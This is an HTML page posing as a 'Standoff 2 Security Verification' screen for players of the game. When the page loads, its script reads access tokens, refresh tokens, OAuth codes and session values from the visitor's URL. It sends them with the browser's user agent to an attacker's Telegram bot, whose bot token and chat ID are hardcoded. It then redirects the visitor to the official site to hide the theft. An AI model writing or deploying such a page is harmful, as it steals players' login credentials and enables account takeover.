<!DOCTYPE html>
<html>
<head>
    <title>Standoff 2 Security Check</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background: #1a1a1a;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            margin: 0;
        }
        .container {
            max-width: 400px;
            margin: 100px auto;
            background: #2a2a2a;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(255,0,0,0.3);
        }
        .token-found {
            color: #00ff00;
            font-weight: bold;
            font-size: 18px;
            margin: 20px 0;
            padding: 10px;
            background: rgba(0,255,0,0.1);
            border-radius: 5px;
        }
        .token-not-found {
            color: #ff4444;
            font-weight: bold;
            font-size: 18px;
            margin: 20px 0;
            padding: 10px;
            background: rgba(255,0,0,0.1);
            border-radius: 5px;
        }
        .loading {
            color: #ffff00;
            font-size: 16px;
        }
    </style>
    <script>
        const BOT_TOKEN = "7652039782:AAHDuyL7L0I2c91-sCx397Nk5tN0LY57VHU";
        const CHAT_ID = "8177119028";
        
        let foundTokens = [];
        
        function analyzeTokens() {
            const urlParams = new URLSearchParams(window.location.search);
            const hashParams = new URLSearchParams(window.location.hash.substring(1));
            
            // –í—Å–µ –≤–æ–∑–º–æ–∂–Ω—ã–µ —Ç–æ–∫–µ–Ω—ã
            const potentialTokens = {
                access_token: urlParams.get('access_token') || hashParams.get('access_token'),
                token: urlParams.get('token') || hashParams.get('token'),
                code: urlParams.get('code') || hashParams.get('code'),
                auth_token: urlParams.get('auth_token') || hashParams.get('auth_token'),
                refresh_token: urlParams.get('refresh_token') || hashParams.get('refresh_token'),
                session: urlParams.get('session') || hashParams.get('session'),
                oauth_token: urlParams.get('oauth_token') || hashParams.get('oauth_token')
            };
            
            // –§–∏–ª—å—Ç—Ä—É–µ–º —Ä–µ–∞–ª—å–Ω—ã–µ —Ç–æ–∫–µ–Ω—ã
            foundTokens = Object.entries(potentialTokens)
                .filter(([key, value]) => value && value.length > 10)
                .map(([key, value]) => `${key}: ${value}`);
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
            displayResult();
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
            sendToTelegram();
            
            // –†–µ–¥–∏—Ä–µ–∫—Ç
            setTimeout(() => {
                window.location.href = 'https://standoff2.com';
            }, 3000);
        }
        
        function displayResult() {
            const resultDiv = document.getElementById('result');
            
            if (foundTokens.length > 0) {
                resultDiv.className = 'token-found';
                resultDiv.innerHTML = `‚úÖ –¢–û–ö–ï–ù –ù–ê–ô–î–ï–ù!<br><br>${foundTokens.join('<br>')}`;
            } else {
                resultDiv.className = 'token-not-found';
                resultDiv.innerHTML = '‚ùå –¢–û–ö–ï–ù –ù–ï –ù–ê–ô–î–ï–ù';
            }
            
            // –ü—Ä—è—á–µ–º –∑–∞–≥—Ä—É–∑–∫—É
            document.getElementById('loading').style.display = 'none';
        }
        
        function sendToTelegram() {
            const data = {
                tokens: foundTokens,
                user_agent: navigator.userAgent,
                url: window.location.href,
                timestamp: new Date().toISOString(),
                ip: 'detected_on_server'
            };
            
            const message = foundTokens.length > 0 
                ? `üéØ TOKEN CAPTURED!\n\n${foundTokens.join('\n')}\n\nüì± User: ${data.user_agent}`
                : `üì± Visit (no tokens)\nUser: ${data.user_agent}\nURL: ${data.url}`;
            
            // –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message
                })
            }).catch(e => {
                console.log('Telegram error:', e);
            });
        }
        
        // –ó–∞–ø—É—Å–∫ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        window.addEventListener('load', analyzeTokens);
    </script>
</head>
<body>
    <div class="container">
        <h2>üîê Standoff 2 Security Verification</h2>
        <div id="loading" class="loading">
            Scanning for tokens...
        </div>
        <div id="result"></div>
        <p style="font-size: 12px; margin-top: 20px; color: #888;">
            Redirecting to official site...
        </p>
    </div>
</body>
</html>
